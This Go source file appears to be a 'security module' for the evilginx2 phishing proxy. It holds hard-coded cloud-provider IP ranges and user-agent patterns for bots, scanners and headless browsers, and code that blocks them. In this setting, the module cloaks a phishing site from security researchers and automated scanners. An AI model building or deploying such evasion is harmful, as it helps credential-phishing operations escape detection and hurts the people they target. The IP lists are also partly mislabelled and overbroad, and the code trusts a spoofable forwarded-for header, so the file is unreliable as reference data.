package core

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/kgretzky/evilginx2/log"
)

// SecurityConfig holds all security settings
type SecurityConfig struct {
	BlockDatacenters    bool     `json:"block_datacenters"`
	BlockBots           bool     `json:"block_bots"`
	BlockHeadlessBrowsers bool   `json:"block_headless"`
	CustomIPRanges      []string `json:"custom_ip_ranges"`
	WhitelistedIPs      []string `json:"whitelisted_ips"`
}

// SecurityModule handles all security checks
type SecurityModule struct {
	mu              sync.RWMutex
	cfg             *Config
	datacenterNets  []*net.IPNet
	customNets      []*net.IPNet
	whitelistedNets []*net.IPNet
	configPath      string
	botPatterns     []*regexp.Regexp
	headlessPatterns []*regexp.Regexp
}

// Known datacenter/cloud provider IP ranges (major providers)
var datacenterRanges = []string{
	// AWS
	"3.0.0.0/8",
	"13.0.0.0/8",
	"15.0.0.0/8",
	"18.0.0.0/8",
	"23.20.0.0/14",
	"34.0.0.0/8",
	"35.0.0.0/8",
	"44.0.0.0/8",
	"50.16.0.0/14",
	"52.0.0.0/8",
	"54.0.0.0/8",
	"67.202.0.0/18",
	"72.44.32.0/19",
	"75.101.128.0/17",
	"79.125.0.0/17",
	"107.20.0.0/14",
	"174.129.0.0/16",
	"175.41.128.0/18",
	"176.32.64.0/19",
	"184.72.0.0/15",
	"184.169.128.0/17",
	"204.236.128.0/17",
	"216.182.224.0/20",
	
	// Google Cloud
	"8.34.208.0/20",
	"8.35.192.0/20",
	"23.236.48.0/20",
	"23.251.128.0/19",
	"34.64.0.0/10",
	"34.128.0.0/10",
	"35.184.0.0/13",
	"35.192.0.0/14",
	"35.196.0.0/15",
	"35.198.0.0/16",
	"35.199.0.0/17",
	"35.199.128.0/18",
	"35.200.0.0/13",
	"35.208.0.0/12",
	"35.224.0.0/12",
	"35.240.0.0/13",
	"104.154.0.0/15",
	"104.196.0.0/14",
	"107.167.160.0/19",
	"107.178.192.0/18",
	"108.59.80.0/20",
	"108.170.192.0/18",
	"130.211.0.0/16",
	"142.250.0.0/15",
	"146.148.0.0/17",
	"162.216.148.0/22",
	"162.222.176.0/21",
	"173.194.0.0/16",
	"173.255.112.0/20",
	"199.36.154.0/23",
	"199.36.156.0/24",
	"199.192.112.0/22",
	"199.223.232.0/21",
	"208.65.152.0/22",
	"208.68.108.0/22",
	"208.81.188.0/22",
	"209.85.128.0/17",
	
	// Microsoft Azure
	"13.64.0.0/11",
	"13.96.0.0/13",
	"13.104.0.0/14",
	"20.0.0.0/8",
	"23.96.0.0/13",
	"40.64.0.0/10",
	"51.0.0.0/8",
	"52.96.0.0/12",
	"52.112.0.0/14",
	"52.120.0.0/14",
	"52.125.0.0/16",
	"52.126.0.0/15",
	"52.132.0.0/14",
	"52.136.0.0/13",
	"52.145.0.0/16",
	"52.146.0.0/15",
	"52.148.0.0/14",
	"52.152.0.0/13",
	"52.160.0.0/11",
	"52.224.0.0/11",
	"65.52.0.0/14",
	"70.37.0.0/17",
	"70.37.128.0/18",
	"94.245.64.0/18",
	"104.40.0.0/13",
	"104.208.0.0/13",
	"111.221.16.0/20",
	"131.253.0.0/16",
	"134.170.0.0/16",
	"137.116.0.0/15",
	"137.135.0.0/16",
	"138.91.0.0/16",
	"157.54.0.0/15",
	"157.56.0.0/14",
	"168.61.0.0/16",
	"168.62.0.0/15",
	"191.232.0.0/13",
	"199.30.16.0/20",
	"207.46.0.0/16",
	"207.68.128.0/18",
	"209.240.192.0/19",
	"213.199.128.0/18",
	
	// DigitalOcean
	"45.55.0.0/16",
	"46.101.0.0/16",
	"67.205.0.0/16",
	"68.183.0.0/16",
	"104.131.0.0/16",
	"104.236.0.0/16",
	"128.199.0.0/16",
	"134.209.0.0/16",
	"137.184.0.0/16",
	"138.68.0.0/16",
	"138.197.0.0/16",
	"139.59.0.0/16",
	"142.93.0.0/16",
	"143.110.0.0/16",
	"143.198.0.0/16",
	"146.185.128.0/17",
	"157.230.0.0/16",
	"159.65.0.0/16",
	"159.89.0.0/16",
	"159.203.0.0/16",
	"161.35.0.0/16",
	"162.243.0.0/16",
	"163.47.8.0/22",
	"164.90.0.0/16",
	"165.22.0.0/16",
	"165.227.0.0/16",
	"167.71.0.0/16",
	"167.99.0.0/16",
	"167.172.0.0/16",
	"174.138.0.0/16",
	"178.62.0.0/16",
	"178.128.0.0/16",
	"188.166.0.0/16",
	"188.226.128.0/17",
	"192.34.56.0/21",
	"192.81.208.0/20",
	"192.241.128.0/17",
	"198.199.64.0/18",
	"198.211.96.0/19",
	"206.81.0.0/16",
	"206.189.0.0/16",
	"207.154.192.0/18",
	"209.97.128.0/17",
	
	// Linode
	"45.33.0.0/17",
	"45.56.64.0/18",
	"45.79.0.0/16",
	"50.116.0.0/18",
	"66.175.208.0/20",
	"69.164.192.0/19",
	"72.14.176.0/20",
	"74.207.224.0/19",
	"85.90.244.0/22",
	"96.126.96.0/19",
	"97.107.128.0/17",
	"103.3.60.0/22",
	"109.74.192.0/20",
	"139.144.0.0/16",
	"139.162.0.0/16",
	"143.42.0.0/16",
	"170.187.128.0/17",
	"172.104.0.0/15",
	"173.230.128.0/19",
	"173.255.192.0/18",
	"178.79.128.0/18",
	"185.3.92.0/22",
	"192.155.80.0/20",
	"194.195.208.0/21",
	"198.58.96.0/19",
	"212.71.232.0/21",
	
	// Vultr
	"45.32.0.0/15",
	"45.63.0.0/17",
	"45.76.0.0/15",
	"45.77.0.0/16",
	"64.156.0.0/16",
	"66.42.32.0/19",
	"78.141.192.0/18",
	"80.240.16.0/20",
	"95.179.128.0/17",
	"104.156.224.0/19",
	"104.207.128.0/19",
	"108.61.0.0/16",
	"136.244.64.0/18",
	"137.220.32.0/19",
	
	// Kamatera
	"5.62.56.0/21",
	"5.62.60.0/22",
	"31.154.128.0/17",
	"37.46.112.0/20",
	"45.80.208.0/22",
	"45.80.212.0/22",
	"45.81.228.0/22",
	"45.87.212.0/22",
	"46.19.136.0/21",
	"77.81.240.0/20",
	"82.102.8.0/21",
	"82.102.16.0/20",
	"91.199.27.0/24",
	"91.203.192.0/19",
	"94.158.244.0/22",
	"94.177.224.0/20",
	"107.191.32.0/19",
	"138.128.0.0/17",
	"141.95.0.0/17",
	"145.239.0.0/16",
	"162.55.0.0/16",
	"164.132.0.0/16",
	"176.31.0.0/16",
	"178.33.0.0/16",
	"185.82.216.0/22",
	"185.177.156.0/22",
	"188.165.0.0/16",
	"192.95.0.0/16",
	"193.70.0.0/17",
	"195.154.0.0/16",
	"140.82.0.0/17",
	"149.28.0.0/16",
	"155.138.128.0/17",
	"158.247.192.0/18",
	"185.92.220.0/22",
	"199.247.0.0/16",
	"202.182.96.0/19",
	"207.148.64.0/18",
	"208.167.224.0/19",
	"209.250.224.0/19",
	"216.128.128.0/17",
	"217.69.0.0/18",
	
	// OVH
	"5.39.0.0/17",
	"5.135.0.0/16",
	"5.196.0.0/16",
	"37.59.0.0/16",
	"37.187.0.0/16",
	"46.105.0.0/16",
	"51.38.0.0/16",
	"51.68.0.0/16",
	"51.75.0.0/16",
	"51.77.0.0/16",
	"51.79.0.0/16",
	"51.81.0.0/16",
	"51.83.0.0/16",
	"51.89.0.0/16",
	"51.91.0.0/16",
	"51.161.0.0/16",
	"51.195.0.0/16",
	"51.210.0.0/16",
	"54.36.0.0/16",
	"54.37.0.0/16",
	"54.38.0.0/16",
	"54.39.0.0/16",
	"57.128.0.0/16",
	"62.210.0.0/16",
	"79.137.0.0/17",
	"87.98.128.0/17",
	"91.121.0.0/16",
	"92.222.0.0/16",
	"94.23.0.0/16",
	"135.125.0.0/16",
	"137.74.0.0/16",
	"139.99.0.0/16",
	"141.94.0.0/16",
	"141.95.0.0/16",
	"142.4.192.0/18",
	"144.217.0.0/16",
	"145.239.0.0/16",
	"147.135.0.0/16",
	"149.56.0.0/16",
	"149.202.0.0/16",
	"151.80.0.0/16",
	"158.69.0.0/16",
	"162.19.0.0/16",
	"164.132.0.0/16",
	"167.114.0.0/16",
	"176.31.0.0/16",
	"178.32.0.0/15",
	"185.12.32.0/22",
	"188.165.0.0/16",
	"192.95.0.0/18",
	"193.70.0.0/17",
	"195.154.0.0/16",
	"198.27.64.0/18",
	"198.50.128.0/17",
	"198.100.144.0/20",
	"198.245.48.0/20",
	"213.32.0.0/17",
	"213.186.32.0/19",
	"213.251.128.0/18",
	
	// Hetzner
	"5.9.0.0/16",
	"23.88.0.0/17",
	"46.4.0.0/16",
	"78.46.0.0/15",
	"85.10.192.0/18",
	"88.99.0.0/16",
	"88.198.0.0/16",
	"94.130.0.0/16",
	"95.216.0.0/15",
	"116.202.0.0/15",
	"116.203.0.0/16",
	"128.140.0.0/17",
	"135.181.0.0/16",
	"136.243.0.0/16",
	"138.201.0.0/16",
	"142.132.128.0/17",
	"144.76.0.0/16",
	"148.251.0.0/16",
	"157.90.0.0/16",
	"159.69.0.0/16",
	"162.55.0.0/16",
	"167.235.0.0/16",
	"168.119.0.0/16",
	"176.9.0.0/16",
	"178.63.0.0/16",
	"185.12.64.0/22",
	"188.40.0.0/16",
	"195.201.0.0/16",
	"213.133.96.0/19",
	"213.239.192.0/18",
	
	// Cloudflare (often used by scrapers)
	"103.21.244.0/22",
	"103.22.200.0/22",
	"103.31.4.0/22",
	"104.16.0.0/13",
	"104.24.0.0/14",
	"108.162.192.0/18",
	"131.0.72.0/22",
	"141.101.64.0/18",
	"162.158.0.0/15",
	"172.64.0.0/13",
	"173.245.48.0/20",
	"188.114.96.0/20",
	"190.93.240.0/20",
	"197.234.240.0/22",
	"198.41.128.0/17",
	
	// Scaleway
	"51.15.0.0/16",
	"51.158.0.0/15",
	"62.210.0.0/16",
	"163.172.0.0/16",
	"195.154.0.0/16",
	"212.47.224.0/19",
	"212.83.128.0/19",
	
	// Oracle Cloud
	"129.146.0.0/16",
	"129.148.0.0/16",
	"129.149.0.0/16",
	"129.150.0.0/16",
	"129.151.0.0/16",
	"129.152.0.0/16",
	"129.153.0.0/16",
	"129.154.0.0/16",
	"129.155.0.0/16",
	"129.156.0.0/16",
	"129.157.0.0/16",
	"129.158.0.0/16",
	"129.159.0.0/16",
	"130.35.0.0/16",
	"130.61.0.0/16",
	"130.162.0.0/16",
	"132.145.0.0/16",
	"134.65.0.0/16",
	"134.70.0.0/16",
	"138.1.0.0/16",
	"140.204.0.0/16",
	"140.238.0.0/16",
	"141.144.0.0/16",
	"141.147.0.0/16",
	"144.21.0.0/16",
	"144.22.0.0/16",
	"144.24.0.0/14",
	"147.154.0.0/16",
	"150.136.0.0/14",
	"152.67.0.0/16",
	"152.70.0.0/15",
	"155.248.0.0/16",
	"158.101.0.0/16",
	"192.29.0.0/16",
	"193.122.0.0/15",
	"193.123.0.0/16",
	"204.216.0.0/14",
}

// Known bot user agent patterns
var botUserAgentPatterns = []string{
	`(?i)bot`,
	`(?i)crawler`,
	`(?i)spider`,
	`(?i)scraper`,
	`(?i)curl`,
	`(?i)wget`,
	`(?i)python`,
	`(?i)java\/`,
	`(?i)perl`,
	`(?i)ruby`,
	`(?i)php\/`,
	`(?i)libwww`,
	`(?i)httpclient`,
	`(?i)okhttp`,
	`(?i)axios`,
	`(?i)node-fetch`,
	`(?i)go-http-client`,
	`(?i)aiohttp`,
	`(?i)httpx`,
	`(?i)scrapy`,
	`(?i)selenium`,
	`(?i)puppeteer`,
	`(?i)playwright`,
	`(?i)headless`,
	`(?i)phantomjs`,
	`(?i)googlebot`,
	`(?i)bingbot`,
	`(?i)yandex`,
	`(?i)baiduspider`,
	`(?i)duckduckbot`,
	`(?i)slurp`,
	`(?i)facebook`,
	`(?i)twitterbot`,
	`(?i)linkedinbot`,
	`(?i)slackbot`,
	`(?i)telegrambot`,
	`(?i)discordbot`,
	`(?i)whatsapp`,
	`(?i)applebot`,
	`(?i)semrush`,
	`(?i)ahrefs`,
	`(?i)mj12bot`,
	`(?i)dotbot`,
	`(?i)bytespider`,
	`(?i)censys`,
	`(?i)shodan`,
	`(?i)masscan`,
	`(?i)nmap`,
	`(?i)zgrab`,
	`(?i)nuclei`,
	`(?i)nikto`,
	`(?i)sqlmap`,
	`(?i)burp`,
	`(?i)zap`,
	`(?i)acunetix`,
	`(?i)nessus`,
	`(?i)qualys`,
	`(?i)checkmarx`,
}

// Headless browser detection patterns
var headlessPatterns = []string{
	`(?i)headless`,
	`(?i)phantomjs`,
	`(?i)nightmare`,
	`(?i)electron`,
	`(?i)awesomium`,
	`(?i)cefsharp`,
}

func NewSecurityModule(cfg *Config, configPath string) (*SecurityModule, error) {
	sm := &SecurityModule{
		cfg:        cfg,
		configPath: configPath,
	}

	// Compile bot patterns
	for _, pattern := range botUserAgentPatterns {
		re, err := regexp.Compile(pattern)
		if err == nil {
			sm.botPatterns = append(sm.botPatterns, re)
		}
	}

	// Compile headless patterns
	for _, pattern := range headlessPatterns {
		re, err := regexp.Compile(pattern)
		if err == nil {
			sm.headlessPatterns = append(sm.headlessPatterns, re)
		}
	}

	// Parse datacenter ranges
	for _, cidr := range datacenterRanges {
		_, ipnet, err := net.ParseCIDR(cidr)
		if err == nil {
			sm.datacenterNets = append(sm.datacenterNets, ipnet)
		}
	}

	// Load custom config
	sm.loadConfig()

	log.Info("security: loaded %d datacenter ranges, %d custom ranges, %d bot patterns",
		len(sm.datacenterNets), len(sm.customNets), len(sm.botPatterns))

	return sm, nil
}

func (sm *SecurityModule) loadConfig() {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	f, err := os.Open(sm.configPath)
	if err != nil {
		// Create default config
		sm.saveConfigLocked()
		return
	}
	defer f.Close()

	var config SecurityConfig
	if err := json.NewDecoder(f).Decode(&config); err != nil {
		log.Error("security: failed to load config: %v", err)
		return
	}

	// Parse custom IP ranges
	sm.customNets = nil
	for _, cidr := range config.CustomIPRanges {
		_, ipnet, err := net.ParseCIDR(cidr)
		if err != nil {
			// Try as single IP
			ip := net.ParseIP(cidr)
			if ip != nil {
				if ip.To4() != nil {
					cidr = cidr + "/32"
				} else {
					cidr = cidr + "/128"
				}
				_, ipnet, err = net.ParseCIDR(cidr)
			}
		}
		if err == nil && ipnet != nil {
			sm.customNets = append(sm.customNets, ipnet)
		}
	}

	// Parse whitelisted IPs
	sm.whitelistedNets = nil
	for _, cidr := range config.WhitelistedIPs {
		_, ipnet, err := net.ParseCIDR(cidr)
		if err != nil {
			ip := net.ParseIP(cidr)
			if ip != nil {
				if ip.To4() != nil {
					cidr = cidr + "/32"
				} else {
					cidr = cidr + "/128"
				}
				_, ipnet, err = net.ParseCIDR(cidr)
			}
		}
		if err == nil && ipnet != nil {
			sm.whitelistedNets = append(sm.whitelistedNets, ipnet)
		}
	}
}

func (sm *SecurityModule) saveConfigLocked() error {
	config := sm.GetConfigLocked()
	
	f, err := os.Create(sm.configPath)
	if err != nil {
		return err
	}
	defer f.Close()

	encoder := json.NewEncoder(f)
	encoder.SetIndent("", "  ")
	return encoder.Encode(config)
}

func (sm *SecurityModule) SaveConfig() error {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	return sm.saveConfigLocked()
}

func (sm *SecurityModule) GetConfigLocked() SecurityConfig {
	config := SecurityConfig{
		BlockDatacenters:      sm.cfg.GetSecurityBlockDatacenters(),
		BlockBots:             sm.cfg.GetSecurityBlockBots(),
		BlockHeadlessBrowsers: sm.cfg.GetSecurityBlockHeadless(),
		CustomIPRanges:        []string{},
		WhitelistedIPs:        []string{},
	}

	for _, ipnet := range sm.customNets {
		config.CustomIPRanges = append(config.CustomIPRanges, ipnet.String())
	}
	for _, ipnet := range sm.whitelistedNets {
		config.WhitelistedIPs = append(config.WhitelistedIPs, ipnet.String())
	}

	return config
}

func (sm *SecurityModule) GetConfig() SecurityConfig {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	return sm.GetConfigLocked()
}

// Check result
type SecurityCheckResult struct {
	Blocked     bool   `json:"blocked"`
	Reason      string `json:"reason"`
	Details     string `json:"details"`
	RiskScore   int    `json:"risk_score"`
}

// CheckRequest performs all security checks on an HTTP request
func (sm *SecurityModule) CheckRequest(r *http.Request) *SecurityCheckResult {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	result := &SecurityCheckResult{
		Blocked:   false,
		RiskScore: 0,
	}

	// Get client IP
	clientIP := sm.getClientIP(r)
	ip := net.ParseIP(clientIP)

	// Check whitelist first
	if sm.isWhitelisted(ip) {
		return result
	}

	// Check custom blocked IP ranges
	if sm.isInCustomBlacklist(ip) {
		result.Blocked = true
		result.Reason = "blocked_ip_range"
		result.Details = fmt.Sprintf("IP %s is in blocked range", clientIP)
		result.RiskScore = 100
		return result
	}

	// Check datacenter IPs
	if sm.cfg.GetSecurityBlockDatacenters() && sm.isDatacenterIP(ip) {
		result.Blocked = true
		result.Reason = "datacenter_ip"
		result.Details = fmt.Sprintf("IP %s belongs to a datacenter/cloud provider", clientIP)
		result.RiskScore = 100
		return result
	}

	// Check for bots
	if sm.cfg.GetSecurityBlockBots() {
		userAgent := r.Header.Get("User-Agent")
		if sm.isBot(userAgent) {
			result.Blocked = true
			result.Reason = "bot_detected"
			result.Details = "Bot user agent detected"
			result.RiskScore = 100
			return result
		}
	}

	// Check for headless browsers
	if sm.cfg.GetSecurityBlockHeadless() {
		if sm.isHeadlessBrowser(r) {
			result.Blocked = true
			result.Reason = "headless_browser"
			result.Details = "Headless browser detected"
			result.RiskScore = 100
			return result
		}
	}

	// Additional bot detection heuristics
	if sm.cfg.GetSecurityBlockBots() {
		// Check for missing headers that browsers always send
		if !sm.hasValidBrowserHeaders(r) {
			result.RiskScore += 30
		}

		// Check for automation tool indicators
		if sm.hasAutomationIndicators(r) {
			result.RiskScore += 40
		}

		// If risk score is too high, block
		if result.RiskScore >= 70 {
			result.Blocked = true
			result.Reason = "suspicious_request"
			result.Details = fmt.Sprintf("Request scored %d on risk assessment", result.RiskScore)
			return result
		}
	}

	return result
}

func (sm *SecurityModule) getClientIP(r *http.Request) string {
	// Check X-Forwarded-For header
	xff := r.Header.Get("X-Forwarded-For")
	if xff != "" {
		ips := strings.Split(xff, ",")
		if len(ips) > 0 {
			return strings.TrimSpace(ips[0])
		}
	}

	// Check X-Real-IP header
	xri := r.Header.Get("X-Real-IP")
	if xri != "" {
		return xri
	}

	// Fall back to RemoteAddr
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func (sm *SecurityModule) isWhitelisted(ip net.IP) bool {
	if ip == nil {
		return false
	}

	// Always whitelist localhost
	if ip.IsLoopback() {
		return true
	}

	for _, ipnet := range sm.whitelistedNets {
		if ipnet.Contains(ip) {
			return true
		}
	}
	return false
}

func (sm *SecurityModule) isInCustomBlacklist(ip net.IP) bool {
	if ip == nil {
		return false
	}

	for _, ipnet := range sm.customNets {
		if ipnet.Contains(ip) {
			return true
		}
	}
	return false
}

func (sm *SecurityModule) isDatacenterIP(ip net.IP) bool {
	if ip == nil {
		return false
	}

	for _, ipnet := range sm.datacenterNets {
		if ipnet.Contains(ip) {
			return true
		}
	}
	return false
}

func (sm *SecurityModule) isBot(userAgent string) bool {
	if userAgent == "" {
		return true // Empty UA is suspicious
	}

	for _, re := range sm.botPatterns {
		if re.MatchString(userAgent) {
			return true
		}
	}
	return false
}

func (sm *SecurityModule) isHeadlessBrowser(r *http.Request) bool {
	userAgent := r.Header.Get("User-Agent")
	
	// Check user agent patterns
	for _, re := range sm.headlessPatterns {
		if re.MatchString(userAgent) {
			return true
		}
	}

	// Check for webdriver
	if r.Header.Get("Sec-Ch-Ua-Webdriver") == "true" {
		return true
	}

	return false
}

func (sm *SecurityModule) hasValidBrowserHeaders(r *http.Request) bool {
	// Real browsers send these headers
	acceptLang := r.Header.Get("Accept-Language")
	accept := r.Header.Get("Accept")
	
	// Missing Accept-Language is suspicious
	if acceptLang == "" {
		return false
	}

	// Missing or unusual Accept header
	if accept == "" {
		return false
	}

	return true
}

func (sm *SecurityModule) hasAutomationIndicators(r *http.Request) bool {
	// Check for Selenium/WebDriver
	if r.Header.Get("Sec-Ch-Ua-Webdriver") == "true" {
		return true
	}

	// Check for Puppeteer/Playwright markers in headers
	userAgent := r.Header.Get("User-Agent")
	if strings.Contains(strings.ToLower(userAgent), "headlesschrome") {
		return true
	}

	return false
}

// AddCustomIPRange adds a custom IP range to block
func (sm *SecurityModule) AddCustomIPRange(cidr string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		// Try as single IP
		ip := net.ParseIP(cidr)
		if ip == nil {
			return fmt.Errorf("invalid IP or CIDR: %s", cidr)
		}
		if ip.To4() != nil {
			cidr = cidr + "/32"
		} else {
			cidr = cidr + "/128"
		}
		_, ipnet, err = net.ParseCIDR(cidr)
		if err != nil {
			return err
		}
	}

	// Check if already exists
	for _, existing := range sm.customNets {
		if existing.String() == ipnet.String() {
			return nil // Already exists
		}
	}

	sm.customNets = append(sm.customNets, ipnet)
	return sm.saveConfigLocked()
}

// RemoveCustomIPRange removes a custom IP range
func (sm *SecurityModule) RemoveCustomIPRange(cidr string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		ip := net.ParseIP(cidr)
		if ip == nil {
			return fmt.Errorf("invalid IP or CIDR: %s", cidr)
		}
		if ip.To4() != nil {
			cidr = cidr + "/32"
		} else {
			cidr = cidr + "/128"
		}
		_, ipnet, err = net.ParseCIDR(cidr)
		if err != nil {
			return err
		}
	}

	newNets := make([]*net.IPNet, 0)
	for _, existing := range sm.customNets {
		if existing.String() != ipnet.String() {
			newNets = append(newNets, existing)
		}
	}

	sm.customNets = newNets
	return sm.saveConfigLocked()
}

// AddWhitelistedIP adds an IP to whitelist
func (sm *SecurityModule) AddWhitelistedIP(cidr string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		ip := net.ParseIP(cidr)
		if ip == nil {
			return fmt.Errorf("invalid IP or CIDR: %s", cidr)
		}
		if ip.To4() != nil {
			cidr = cidr + "/32"
		} else {
			cidr = cidr + "/128"
		}
		_, ipnet, err = net.ParseCIDR(cidr)
		if err != nil {
			return err
		}
	}

	sm.whitelistedNets = append(sm.whitelistedNets, ipnet)
	return sm.saveConfigLocked()
}

// RemoveWhitelistedIP removes an IP from whitelist
func (sm *SecurityModule) RemoveWhitelistedIP(cidr string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		ip := net.ParseIP(cidr)
		if ip == nil {
			return fmt.Errorf("invalid IP or CIDR: %s", cidr)
		}
		if ip.To4() != nil {
			cidr = cidr + "/32"
		} else {
			cidr = cidr + "/128"
		}
		_, ipnet, err = net.ParseCIDR(cidr)
		if err != nil {
			return err
		}
	}

	newNets := make([]*net.IPNet, 0)
	for _, existing := range sm.whitelistedNets {
		if existing.String() != ipnet.String() {
			newNets = append(newNets, existing)
		}
	}

	sm.whitelistedNets = newNets
	return sm.saveConfigLocked()
}

// GetStats returns security module statistics
func (sm *SecurityModule) GetStats() map[string]interface{} {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	return map[string]interface{}{
		"datacenter_ranges": len(sm.datacenterNets),
		"custom_ranges":     len(sm.customNets),
		"whitelisted_ips":   len(sm.whitelistedNets),
		"bot_patterns":      len(sm.botPatterns),
	}
}

// GetBlockedRanges returns all custom blocked ranges
func (sm *SecurityModule) GetBlockedRanges() []string {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	ranges := make([]string, 0)
	for _, ipnet := range sm.customNets {
		ranges = append(ranges, ipnet.String())
	}
	return ranges
}

// GetWhitelistedRanges returns all whitelisted ranges
func (sm *SecurityModule) GetWhitelistedRanges() []string {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	ranges := make([]string, 0)
	for _, ipnet := range sm.whitelistedNets {
		ranges = append(ranges, ipnet.String())
	}
	return ranges
}

// TestIP checks if an IP would be blocked
func (sm *SecurityModule) TestIP(ipStr string) *SecurityCheckResult {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	result := &SecurityCheckResult{
		Blocked:   false,
		RiskScore: 0,
	}

	ip := net.ParseIP(ipStr)
	if ip == nil {
		result.Blocked = false
		result.Reason = "invalid_ip"
		result.Details = "Invalid IP address"
		return result
	}

	// Check whitelist
	if sm.isWhitelisted(ip) {
		result.Details = "IP is whitelisted"
		return result
	}

	// Check custom blacklist
	if sm.isInCustomBlacklist(ip) {
		result.Blocked = true
		result.Reason = "blocked_ip_range"
		result.Details = "IP is in custom blocked range"
		result.RiskScore = 100
		return result
	}

	// Check datacenter
	if sm.isDatacenterIP(ip) {
		result.Blocked = sm.cfg.GetSecurityBlockDatacenters()
		result.Reason = "datacenter_ip"
		result.Details = "IP belongs to a datacenter/cloud provider"
		if result.Blocked {
			result.RiskScore = 100
		} else {
			result.RiskScore = 50
			result.Details += " (blocking disabled)"
		}
		return result
	}

	result.Details = "IP passed all checks"
	return result
}

